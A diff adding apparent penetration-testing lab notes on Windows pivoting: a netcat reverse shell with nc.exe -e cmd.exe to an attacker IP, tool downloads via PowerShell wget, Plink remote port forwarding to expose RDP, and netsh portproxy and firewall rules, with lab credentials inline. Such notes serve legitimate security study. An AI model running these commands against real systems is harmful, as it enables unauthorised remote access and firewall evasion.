@@ -2076,3 +2076,100 @@ now we an act as though we have access to new host
 ```
 smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
 ```
+
+## Window SSH
+
+### ssh.exe
+Need ssh client > 7.6 for remote dynamic port forwarding
+```
+where ssh
+ssh.exe -V
+```
+
+### Plink
+Before OpenSSH was so readily available on Windows, most network administrators' tools of choice were PuTTY1 and its command-line-only counterpart, Plink. The Plink manual2:1 explains that much of the functionality the OpenSSH client offers is also built into Plink (although one notable feature Plink doesn't have is remote dynamic port forwarding).
+
+first we want to start http server and download nc.exe to windows machine
+```
+sudo systemctl start apache2
+find / -name nc.exe 2>/dev/null
+find / -name nc.exe 2>/dev/null
+sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
+```
+
+can use powershell wget command to download file
+```
+powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
+```
+
+setup nc listener
+```
+nc -nvlp 4446
+```
+run on windows
+```
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
+```
+
+now downloaad plink.exe to windows
+```
+find / -name plink.exe 2>/dev/null
+sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
+powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
+```
+
+can setup remote port forward with the following
+```
+C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+```
+
+if we don't have a tty shell we'll have to attach echo y to the front
+```
+cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
+```
+
+also need to be careful about windows logging our pw
+
+now we can confirm remote port forwarding and connect via rdp
+```
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
+```
+
+### Netsh
+
+good for poking holes in firewall when we need port forwarding but firewall blocks it
+
+Using this window, we can run Netsh. We'll instruct netsh interface to add a portproxy rule from an IPv4 listener that is forwarded to an IPv4 port (v4tov4). This will listen on port 2222 on the external-facing interface (listenport=2222 listenaddress=192.168.50.64) and forward packets to port 22 on PGDATABASE01 (connectport=22 connectaddress=10.4.50.215).
+
+```
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
+```
+
+check listening ports with netstat
+```
+netstat -anp TCP | find "2222"
+```
+
+We can also confirm that the port forward is stored by issuing the show all command in the netsh interface portproxy subcontext.
+```
+netsh interface portproxy show all
+```
+
+if port is blocked by firewall we have to set up a rule to allow connections
+```
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
+```
+
+ssh should work now
+```
+ssh database_admin@192.168.50.64 -p2222
+```
+can delete the rule afterwards
+```
+netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
+```
+can also delete the portproxy
+```
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
+```
+
